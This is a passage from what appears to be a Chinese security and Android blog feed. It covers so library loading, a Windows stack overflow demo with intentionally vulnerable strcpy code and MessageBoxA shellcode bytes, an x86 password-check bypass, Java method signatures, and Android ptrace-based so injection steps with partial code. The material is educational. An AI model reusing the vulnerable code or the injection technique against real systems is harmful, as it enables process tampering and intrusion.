dlsym(pLib-&gt;handle, mangleCM);</span><br><span class="line"></span><br><span class="line">    ..........</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">int</span>) func;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>dvmHashForeach就是遍历的，参数中传入了一个函数指针，就是说遍历时调这个函数指针来判断是否找到。找到的依据就是通过dlsym找到了我们要的符号。</p><blockquote><p>用dlopen加载so，然后全局缓存起来。当要调so中的函数时，就用dlsym到so中找到对应的函数指针。值得注意的是，类初始化时，所有的native函数的指针都指向了dvmResolveNativeMethod，表示这个函数还有待解析。如果主动在JNI_Onload中注册了，就会将函数指针指向一个Bridge，而真正要执行的函数指针赋给了insns。如果没有主动注册过，执行native函数时就会先解析函数，找到该函数真正要执行的函数指针，然后同样要指定一个Bridge，之后的流程都一样了。</p><p>这个Bridge的作用是什么呢？为什么要中间多这么一层呢？一方面是准备参数，另一方面虚拟机调用so中的函数，而so是编译于不同平台下的，不同平台下函数调用的参数传递规则是不同的，是入栈还是放在寄存器中，如果是入栈那么内存布局是什么样的，还有函数返回值怎么传递给调用者，这些都是平台相关的，有的甚至是用汇编写的。所以为了屏蔽这些不同，Dalvik虚拟机用了libffi开源库来统一调用接口，调用时也不是直接调用的，而是统一通过dvmPlatformInvoke来调用so中的函数。感兴趣的可以参考<a href="http://sourceware.org/libffi/" target="_blank" rel="noopener">http://sourceware.org/libffi/</a></p></blockquote><p>完结，撒花 ：）</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文源码摘自 android-6.0.0_r24分支&lt;/p&gt;
&lt;p&gt;主要内容为梳理Android调用 System.loadLibrary()加载so库时的调用链&lt;/p&gt;
    
    </summary>
    
    
      <category term="Android" scheme="http://imlzq.com/tags/Android/"/>
    
      <category term="源码" scheme="http://imlzq.com/tags/%E6%BA%90%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>栈溢出</title>
    <link href="http://imlzq.com/2018/02/01/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    <id>http://imlzq.com/2018/02/01/栈溢出/</id>
    <published>2018-01-31T16:00:00.000Z</published>
    <updated>2018-02-12T09:53:46.970Z</updated>
    
    <content type="html"><![CDATA[<p>windows 栈溢出</p><a id="more"></a>    <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line"></span><br><span class="line">#define PASSWORD "1234567"</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">verify_password</span><span class="params">(<span class="keyword">char</span> *password)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"><span class="keyword">char</span> buff[<span class="number">44</span>];</span><br><span class="line">ret = strcmp(password, PASSWORD);</span><br><span class="line">strcpy(buff, password);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> flag = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> password[<span class="number">1024</span>];</span><br><span class="line">FILE *fp;</span><br><span class="line"></span><br><span class="line">LoadLibrary(<span class="string">"user32.dll"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!(fp= fopen(<span class="string">"C://Users//CytQ//Desktop//password.txt"</span>, <span class="string">"rw+"</span>)))</span><br><span class="line">&#123;</span><br><span class="line">exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">fscanf(fp, <span class="string">"%s"</span>, password);</span><br><span class="line"></span><br><span class="line">flag = verify_password(password);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(flag)</span><br><span class="line">&#123;</span><br><span class="line">printf(<span class="string">"Failed\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line">printf(<span class="string">"pass\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fclose(fp);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PASSWORD.TXT: IN HEX</p><p><img src="http://bos.nj.bpc.baidu.com/v1/agroup/e0742c48617627b8f81bed1f048b804019d349b3" alt="PASSWORD.TXT"></p><p>HEX IS : 33 DB 53 68 C6 F4 DD 01 68 C6 F4 DD 01 8B C4 53 50 50 53 B8 AE FE 96 75 FF D0</p><p>MessageBoxA IN USER32.DLL  ABSOLUTELY ADDRESS: 0X7596feae</p><p><img src="http://bos.nj.bpc.baidu.com/v1/agroup/b2d4e4b6c30d21c83a666bd6e67b6f862552e118" alt="RESULT"></p><p>AND THEN, CRASH</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;windows 栈溢出&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞" scheme="http://imlzq.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>x86汇编示例、代码梳理和演示</title>
    <link href="http://imlzq.com/2018/01/30/x86%E6%B1%87%E7%BC%96%E7%A4%BA%E4%BE%8B%E3%80%81%E4%BB%A3%E7%A0%81%E6%A2%B3%E7%90%86%E5%92%8C%E6%BC%94%E7%A4%BA/"/>
    <id>http://imlzq.com/2018/01/30/x86汇编示例、代码梳理和演示/</id>
    <published>2018-01-30T15:00:00.000Z</published>
    <updated>2018-04-05T12:50:28.937Z</updated>
    
    <content type="html"><![CDATA[<p>x86跟ARM在一些指令集上有区别，但是大致逻辑一直。下面是以一个有栈溢出漏洞的vc6.0编写的C程序做示例。</p><a id="more"></a>    <p><strong>C中，函数调用的逻辑为：</strong></p><p>##1. 函数参数入栈</p><p>如func(int a, int b, int c)<br>会将三个参数从右到左依次入栈。也就是<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push c</span><br><span class="line">push b</span><br><span class="line">push a</span><br></pre></td></tr></table></figure></p><p>##2.函数的返回地址入栈</p><p>让程序知道执行完当前程序后怎么处理下一步。在汇编中的表现形式和3合并</p><p>##3.代码区跳转</p><p>跳转到被调用函数的入口地址，方便执行。<br>它和2的表现为<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call 函数地址</span><br></pre></td></tr></table></figure></p><p>##4.栈帧调整</p><p>这里会有3步</p><pre><code>1. 保存当前的栈帧：push ebp2. 设置新栈帧的底部：move ebp, esp3. 抬高esp，也就是分配栈帧空间： sub esp, xx</code></pre><p>##5. 【本函数调用完后】降低栈帧，释放空间</p><p>add esp, xx</p><p><strong>这样也就完成了一个函数的整体调用，具体的看下面的截图和其中的注释</strong></p><blockquote><p>对于下面的局部变量申明，有一点需要注意的。<br>比如第2张图，var_444 = -444h，这个负号是因为它比当前的ebp先入栈。对于当前函数来说，高于ebp是正数，低于的就是负数。ebp可以理解为0这个基线，-444h就能找到它的指定位置</p></blockquote><p><img src="http://bos.nj.bpc.baidu.com/v1/agroup/9db03478a7c26d09e292d5de2ccaee55fba888e1" alt="x86汇编7"><br><img src="http://bos.nj.bpc.baidu.com/v1/agroup/3ccc297a5046230c0a2a2833f5eac13e28464aa1" alt="x86汇编1"><br><img src="http://bos.nj.bpc.baidu.com/v1/agroup/67b739dbe7196b2b63df67c16a5281a842d3c0c2" alt="x86汇编2"><br><img src="http://bos.nj.bpc.baidu.com/v1/agroup/1c27973a000662e8ff0cb4d636da661eec1c70dd" alt="x86汇编3"><br><img src="http://bos.nj.bpc.baidu.com/v1/agroup/f7d7dd01054ec84e5505ecc96a496b3ecc8cbaa3" alt="x86汇编4"><br><img src="http://bos.nj.bpc.baidu.com/v1/agroup/14e5790bbe380bcd7eb7674ee1a3ec5db3a7a139" alt="x86汇编5"><br><img src="http://bos.nj.bpc.baidu.com/v1/agroup/52c078db92a32c0de0d7ed69f5b098a5d33cd938" alt="x86汇编6"></p><p><img src="http://bos.nj.bpc.baidu.com/v1/agroup/1bea2f9369aa419f2e49f5e324c9028f5aea8491" alt="x86汇编8"></p><p>对于verify_password函数来说，它的栈帧为（从下到上）：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> buff[<span class="number">0</span>~<span class="number">3</span>]</span><br><span class="line"><span class="keyword">char</span> buff[<span class="number">4</span>~<span class="number">7</span>]</span><br><span class="line"><span class="keyword">int</span> ret</span><br><span class="line">上一个栈帧的EBP</span><br><span class="line">verify_password函数的返回地址</span><br><span class="line">形参password</span><br></pre></td></tr></table></figure></p><p>此时的EBP指针指向”上一个栈帧的EBP”, ESP指向”char buff[0~3]”。</p><p>##绕过密码检测</p><p>对于ret来说，int值为4个字节，所以只需要在strcpy时让buff越界四位，那么buff[8]，buff[9], buff[10], buff[11]就会覆盖ret的值。这里有个tips，对于字符串而言，末尾会自动加入一个NULL结束符，所以只要我们输入任意的8个字符，如12345678，就能通过这个密码程序（正确的密码是1234567）。<br>ret的值其实来源于strcmp的返回值，根据字符串的串顺序，如果password&gt;1234567如12345678），那么ret=0x00000001，这个时候我们就可以用NULL覆盖的方法让它变为0x00000000。而如果password&lt;1234567（如12345668），函数返回-1，此时ret=0xFFFFFF00，这时候用NULL就覆盖不了了</p><p>下图为输入1234567后栈顶保存的数据，它指向0018FB44这个地址，而这个地址的内容为（ASCII码）31,32,33,34,35,36,37。也就是数字的1234567.最后的00，是存放字符串的NULL的<br><img src="http://bos.nj.bpc.baidu.com/v1/agroup/751d9617eecf24590d26c53e20cecb53d6b48ec8" alt="图片"></p><p><img src="http://bos.nj.bpc.baidu.com/v1/agroup/cc3d43d6bcea77d2a5d5d621d0edd619ff520561" alt="图片"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;x86跟ARM在一些指令集上有区别，但是大致逻辑一直。下面是以一个有栈溢出漏洞的vc6.0编写的C程序做示例。&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞" scheme="http://imlzq.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="汇编" scheme="http://imlzq.com/tags/%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>Java函数签名</title>
    <link href="http://imlzq.com/2018/01/30/Java%E5%87%BD%E6%95%B0%E7%AD%BE%E5%90%8D/"/>
    <id>http://imlzq.com/2018/01/30/Java函数签名/</id>
    <published>2018-01-30T13:00:00.000Z</published>
    <updated>2018-04-06T15:53:14.920Z</updated>
    
    <content type="html"><![CDATA[<p><strong>表现形式：</strong></p><p>(参数类型参数类型参数类型参数类型)函数类型</p><p><strong>例如：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">encrypt</span><span class="params">(<span class="keyword">int</span> res, String test, <span class="keyword">long</span> key)</span></span></span><br></pre></td></tr></table></figure><p><strong>函数方法体为：</strong></p><p>(ILjava/lang/String;J)I</p><ul><li>I   代表int</li><li>Ljava/lang/String;  代表String。因为它不属于基本数据类型，是一个类，所以需要指定完整的路径</li><li>J代表long</li></ul><p>参数与参数之间无间隔，用括号包裹，紧接着跟函数的数据类型。</p><a id="more"></a>    <h2 id="获取函数的方法签名"><a href="#获取函数的方法签名" class="headerlink" title="获取函数的方法签名"></a>获取函数的方法签名</h2><p>如：针对Hello.class，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javap -s Hello</span><br></pre></td></tr></table></figure><p>即可获取其内部所有的函数方法签名</p><p>##Java方法签名中特殊字符/字母含义</p><table><thead><tr><th>特殊字符</th><th>数据类型</th><th>特殊说明</th></tr></thead><tbody><tr><td>V</td><td>void</td><td>返回值</td></tr><tr><td>Z</td><td>boolean</td><td></td></tr><tr><td>B</td><td>byte</td><td></td></tr><tr><td>C</td><td>char</td><td></td></tr><tr><td>S</td><td>short</td><td></td></tr><tr><td>I</td><td>int</td><td></td></tr><tr><td>J</td><td>long</td><td></td></tr><tr><td>F</td><td>float</td><td></td></tr><tr><td>D</td><td>double</td><td></td></tr><tr><td>[</td><td>数组</td><td>以[开头，配合其他的特殊字符，表示对应数据类型的数组，几个[表示几维数组</td></tr><tr><td>L全类名;</td><td>引用类型</td><td>以L开头、;结尾，中间是引用类型的全类名</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;表现形式：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;(参数类型参数类型参数类型参数类型)函数类型&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;例如：&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;encrypt&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; res, String test, &lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; key)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;函数方法体为：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;(ILjava/lang/String;J)I&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;I   代表int&lt;/li&gt;
&lt;li&gt;Ljava/lang/String;  代表String。因为它不属于基本数据类型，是一个类，所以需要指定完整的路径&lt;/li&gt;
&lt;li&gt;J代表long&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;参数与参数之间无间隔，用括号包裹，紧接着跟函数的数据类型。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Android" scheme="http://imlzq.com/tags/Android/"/>
    
      <category term="Java" scheme="http://imlzq.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>So注入</title>
    <link href="http://imlzq.com/2018/01/09/so_inject/"/>
    <id>http://imlzq.com/2018/01/09/so_inject/</id>
    <published>2018-01-09T14:26:24.000Z</published>
    <updated>2018-04-14T08:17:48.242Z</updated>
    
    <content type="html"><![CDATA[<p><strong>so注入的主要思路是：</strong></p><ol><li>找到目标进程</li><li>使用ptrace跟踪目标进程，保存目标进程的状态</li><li>获得mmap、dlopen、dlsym等库函数在目标进程中的偏移地址</li><li>调用mmap在目标进程内部申请一段内存空间</li><li>将我们的ShellCode写入到刚才申请的内存空间中</li><li>dlopen打开Shellcode，dlsym调用Shellcode库的函数</li><li>恢复原so状态，detach</li></ol><a id="more"></a><h1 id="核心点"><a href="#核心点" class="headerlink" title="核心点"></a>核心点</h1><h2 id="ptrace"><a href="#ptrace" class="headerlink" title="ptrace"></a>ptrace</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">long</span> ptrace（<span class="keyword">enum</span> _ptrace_request request,<span class="keyword">pid_t</span> pid,<span class="keyword">void</span> * addr ,<span class="keyword">void</span> *data）;</span><br><span class="line"></span><br><span class="line">    <span class="number">1</span>). <span class="keyword">enum</span> __ptrace_request request：指示了ptrace要执行的命令。</span><br><span class="line">    <span class="number">2</span>). <span class="keyword">pid_t</span> pid: 指示ptrace要跟踪的进程。</span><br><span class="line">    <span class="number">3</span>). <span class="keyword">void</span> *addr: 指示要监控的内存地址。</span><br><span class="line">    <span class="number">4</span>). <span class="keyword">void</span> *data: 存放读取出的或者要写入的数据。</span><br></pre></td></tr></table></figure><p>简单点，ptrace是个系统调用，功能是提供一个进程（父进程）监控和管理另一个进程（子进程）的能力，并允许父进程检查和替换子进程的内核镜像(包括寄存器)的值。</p><p>基本原理是: 当使用了ptrace跟踪后，所有发送给被跟踪的子进程的信号(除了SIGKILL)，都会被转发给父进程，而子进程则会被阻塞，这时子进程的状态就会被系统标注为TASK_TRACED。而父进程收到信号后，就可以对停止下来的子进程进行检查和修改，然后让子进程继续运行。   </p><blockquote><p>ptrace命令</p><p>1). 用PTRACE_ATTACH或者PTRACE_TRACEME 建立进程间的跟踪关系。<br>2). PTRACE_PEEKTEXT, PTRACE_PEEKDATA, PTRACE_PEEKUSR等读取子进程内存/寄存器中保留的值。<br>3). PTRACE_POKETEXT, PTRACE_POKEDATA, PTRACE_POKEUSR等把值写入到被跟踪进程的内存/寄存器中<br>4). 用PTRACE_CONT，PTRACE_SYSCALL, PTRACE_SINGLESTEP控制被跟踪进程以何种方式继续运行。<br>5). PTRACE_DETACH, PTRACE_KILL 脱离进程间的跟踪关系。</p><p>TIPS:</p><pre><code>1. 进程状态TASK_TRACED用以表示当前进程因为被父进程跟踪而被系统停止。2. 如在子进程结束前，父进程结束，则trace关系解除。3. 利用attach建立起来的跟踪关系，虽然ps看到双方为父子关系，但在&quot;子进程&quot;中调用getppid()仍会返回原来的父进程id。4. 不能attach到自己不能跟踪的进程，如non-root进程跟踪root进程。5. 已经被trace的进程，不能再次被attach。6. 即使是用PTRACE_TRACEME建立起来的跟踪关系，也可以用DETACH的方式予以解除。7. 因为进入/退出系统调用都会触发一次SIGTRAP，所以通常的做法是在第一次(进入)的时候读取系统调用的参数，在第二次(退出)的时候读取系统调用的返回值。但注意execve是个例外。8. 程序调试时的断点由int 3设置完成，而单步跟踪则可由ptrace(PTRACE_SINGLESTEP)实现。</code></pre></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>(pid = fork())  </span><br><span class="line">   &#123;  </span><br><span class="line">   <span class="keyword">case</span> <span class="number">-1</span>:  </span><br><span class="line">       <span class="keyword">return</span> <span class="number">-1</span>;  </span><br><span class="line">   <span class="keyword">case</span> <span class="number">0</span>: <span class="comment">//子进程  </span></span><br><span class="line">       ptrace(PTRACE_TRACEME,<span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>);  </span><br><span class="line">       execl(<span class="string">"./HelloWorld"</span>, <span class="string">"HelloWorld"</span>, <span class="literal">NULL</span>);  </span><br><span class="line">   <span class="keyword">default</span>: <span class="comment">//父进程  </span></span><br><span class="line">       wait(&amp;val); <span class="comment">//等待并记录execve  </span></span><br><span class="line">       <span class="keyword">if</span>(WIFEXITED(val))  </span><br><span class="line">           <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">       syscallID=ptrace(PTRACE_PEEKUSER, pid, ORIG_EAX*<span class="number">4</span>, <span class="literal">NULL</span>);  </span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">"Process executed system call ID = %ld/n"</span>,syscallID);  </span><br><span class="line">       ptrace(PTRACE_SYSCALL,pid,<span class="literal">NULL</span>,<span class="literal">NULL</span>);  </span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>在上面的程序中，fork出的子进程先调用了ptrace(PTRACE_TRACEME)表示子进程让父进程跟踪自己。然后子进程调用execl加载执行了HelloWorld。</p><p>而在父进程中则使用wait系统调用等待子进程的中断或结束。子进程因为设置了PTRACE_TRACEME而在执行系统调用被系统停止(设置为TASK_TRACED)，这时父进程被唤醒，使用ptrace(PTRACE_PEEKUSER,pid,…)分别去读取子进程执行的系统调用ID(放在ORIG_EAX中)以及系统调用返回时的值(放在EAX中)。然后使用ptrace(PTRACE_SYSCALL,pid,…)指示子进程运行到下一次执行系统调用的时候(进入或者退出)，直到子进程退出为止。</p><blockquote><p>wait指令会让父进程挂起，等待子进程的中断或结束</p></blockquote><h3 id="断点原理"><a href="#断点原理" class="headerlink" title="断点原理"></a>断点原理</h3><p>断点是大家在调试程序时常用的一个功能,如break linenumber，当执行到linenumber那一行的时候被调试程序会停止，等待debugger的进一步操作。<br>断点的实现原理，就是在指定的位置插入断点指令，当被调试的程序运行到断点的时候，产生SIGTRAP信号。该信号被gdb捕获并进行断点命中判定，当gdb判断出这次SIGTRAP是断点命中之后就会转入等待用户输入进行下一步处理，否则继续。</p><p>断点的设置原理: 在程序中设置断点，就是先将该位置的原来的指令保存，然后向该位置写入int 3。当执行到int 3的时候，发生软中断，内核会给子进程发出SIGTRAP信号，当然这个信号会被转发给父进程。然后用保存的指令替换int3,等待恢复运行。<br>断点命中判定:gdb把所有的断点位置都存放在一个链表中，命中判定即把被调试程序当前停止的位置和链表中的断点位置进行比较，看是断点产生的信号，还是无关信号。</p><h3 id="单步调试"><a href="#单步调试" class="headerlink" title="单步调试"></a>单步调试</h3><p>单步跟踪就是指在调试程序的时候，让程序运行一条指令/语句后就停下。GDB中常用的命令有next, step, nexti, stepi。单步跟踪又常分为语句单步(next, step)和指令单步(如nexti, stepi)。</p><p>在linux上，指令单步可以通过ptrace来实现。调用ptrace(PTRACE_SINGLESTEP,pid,…)可以使被调试的进程在每执行完一条指令后就触发一个SIGTRAP信号，让GDB运行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">child = fork();  </span><br><span class="line">   <span class="keyword">if</span>(child == <span class="number">0</span>) &#123;  </span><br><span class="line">        execl(<span class="string">"./HelloWorld"</span>, <span class="string">"HelloWorld"</span>, <span class="literal">NULL</span>);  </span><br><span class="line">   &#125;  </span><br><span class="line">   <span class="keyword">else</span> &#123;  </span><br><span class="line">       ptrace(PTRACE_ATTACH,child,<span class="literal">NULL</span>,<span class="literal">NULL</span>);  </span><br><span class="line">       <span class="keyword">while</span>(<span class="number">1</span>)&#123;  </span><br><span class="line">       wait(&amp;val);  </span><br><span class="line">       <span class="keyword">if</span>(WIFEXITED(val))  </span><br><span class="line">           <span class="keyword">break</span>;  </span><br><span class="line">       count++;  </span><br><span class="line">       ptrace(PTRACE_SINGLESTEP,child,<span class="literal">NULL</span>,<span class="literal">NULL</span>);  </span><br><span class="line">       &#125;  </span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"Total Instruction number= %d/n"</span>,count);  </span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h1 id="1、找到目标进程"><a href="#1、找到目标进程" class="headerlink" title="1、找到目标进程"></a>1、找到目标进程</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pid_t</span> target_pid;</span><br><span class="line"></span><br><span class="line"><span class="comment">// PS命令能找到的进程</span></span><br><span class="line">target_pid = find_pid_of(<span class="string">"/system/bin/logwrapper"</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="number">-1</span> == target_pid) &#123;  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Can't find the process\n"</span>);  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>找到目标进程的实现方式为：通过proc文件系统来一一比较。</p><blockquote><p>在Linux上，proc是一个伪文件系统，提供了访问内核数据的方法，一般挂载在“/proc”目录</p></blockquote><p>每个正在运行着的进程都proc下都会有个目录，目录名为pid。</p><p>例如init进程，它的pid为1，所以对应/proc/1/，这个目录下保存的就是Init进程相关的数据。</p><p><strong>找到目标进程的逻辑：</strong></p><ul><li>打开proc目录</li><li>读取该目录，并转为dirent</li><li>读取dirent-&gt;d_name值，并转为int号，也就是pid号</li><li>在循环遍历每一个读取到的pid目录下的cmdline，用\0’分割其中的字符串得到进程的args[]，拿到args[0]，也就是进程的绝对路径</li><li>匹配进程名是否一致</li></ul><p><strong>dirent：</strong>是一个结构体，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dirent</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">long</span> d_ino; <span class="comment">/* inode number 索引节点号 */</span></span><br><span class="line">  <span class="keyword">off_t</span> d_off; <span class="comment">/* offset to this dirent 在目录文件中的偏移 */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> d_reclen; <span class="comment">/* length of this d_name 文件名长 */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> d_type; <span class="comment">/* the type of d_name 文件类型 */</span></span><br><span class="line">  <span class="keyword">char</span> d_name [NAME_MAX+<span class="number">1</span>]; <span class="comment">/* file name (null-terminated) 文件名，最长256字符 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>cmdline：</strong>存储的是main方法用的参数，也就是args，args[0]就是进程的绝对路径</p><p>代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find_pid_of</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *process_name)</span>    </span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    <span class="keyword">int</span> id;    </span><br><span class="line">    <span class="keyword">pid_t</span> pid = <span class="number">-1</span>;    </span><br><span class="line">    DIR* dir;    </span><br><span class="line">    FILE *fp;    </span><br><span class="line">    <span class="keyword">char</span> filename[<span class="number">32</span>];    </span><br><span class="line">    <span class="keyword">char</span> cmdline[<span class="number">256</span>];    </span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> * <span class="title">entry</span>;</span>    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (process_name == <span class="literal">NULL</span>)    </span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;    </span><br><span class="line">    </span><br><span class="line">    dir = opendir(<span class="string">"/proc"</span>);    </span><br><span class="line">    <span class="keyword">if</span> (dir == <span class="literal">NULL</span>)    </span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;    </span><br><span class="line">    </span><br><span 